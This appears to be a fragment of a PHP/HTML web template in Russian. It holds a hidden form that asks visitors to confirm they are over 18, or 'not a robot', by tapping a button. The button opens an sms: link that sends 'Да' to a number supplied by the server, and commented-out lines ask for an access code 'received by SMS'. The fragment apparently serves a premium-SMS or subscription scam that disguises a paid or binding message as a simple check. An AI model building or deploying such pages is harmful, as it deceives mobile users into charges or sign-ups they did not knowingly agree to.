<form id='formcode' style="display: none">
<!--
    <span>
        Для получения полного доступа, Вам необходимо <span class="free">подтвердить, что Вы не робот</span>
    </span>
    <span>Введите код доступа,<br><span class="free">полученный</span> Вами в смс-сообщении:
    </span>
    <input type="tel" value="" placeholder="X X X X" id="input_code">

    <p id="infocode" style="display:none;">Код неверный</p>
    -->
    <p>Подтвердите, что вам есть 18 лет,<br> нажав кнопку «Да» и отправив СМС!</p>
<!--
    <button type="button" class="enter-button code">Смотреть</button>
-->

    <a href="sms:<?= $send_to_phone; ?>;?&body=Да" class="code" type="button">Да</a>


    <button class="check" type="button">перейти далее</button>
</form>
